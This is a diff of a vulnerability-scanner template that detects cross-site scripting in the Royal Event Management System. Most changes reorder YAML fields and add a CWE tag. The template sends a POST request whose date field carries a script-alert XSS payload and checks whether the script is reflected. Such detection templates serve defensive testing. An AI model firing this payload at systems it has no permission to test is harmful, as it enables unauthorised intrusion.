@@ -1,5 +1,4 @@
 id: royalevent-management-xss
-
 info:
   name: Royal Event Management System - Cross-Site Scripting
   author: ritikchaddha
@@ -12,15 +11,28 @@ info:
   classification:
     cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
     cvss-score: 7.2
-    cwe-id: CWE-79
+    cwe-id: CWE-79,CWE-80
   metadata:
     runzero-review: REJECT/2025-11-07/excluding tag authenticated
-    verified: true
     max-request: 2
-  tags: cms,royalevent,packetstorm,xss,authenticated,intrusive,vuln
-
+    verified: true
+  tags: authenticated,cms,intrusive,packetstorm,royalevent,vuln,xss
 http:
-  - raw:
+  - matchers:
+      - condition: and
+        type: word
+        words:
+          - <script>alert(document.domain)</script>
+          - 'Report from '
+      - part: header
+        type: word
+        words:
+          - text/html
+      - status:
+          - 200
+        type: status
+    matchers-condition: and
+    raw:
       - |
         POST /royal_event/ HTTP/1.1
         Host: {{Hostname}}
@@ -57,21 +69,3 @@ http:
 
         2022-06-22<script>alert(document.domain)</script>
         ------WebKitFormBoundaryFboH5ITu7DsGIGrD--
-
-    matchers-condition: and
-    matchers:
-      - type: word
-        words:
-          - "<script>alert(document.domain)</script>"
-          - "Report from "
-        condition: and
-
-      - type: word
-        part: header
-        words:
-          - text/html
-
-      - type: status
-        status:
-          - 200
-
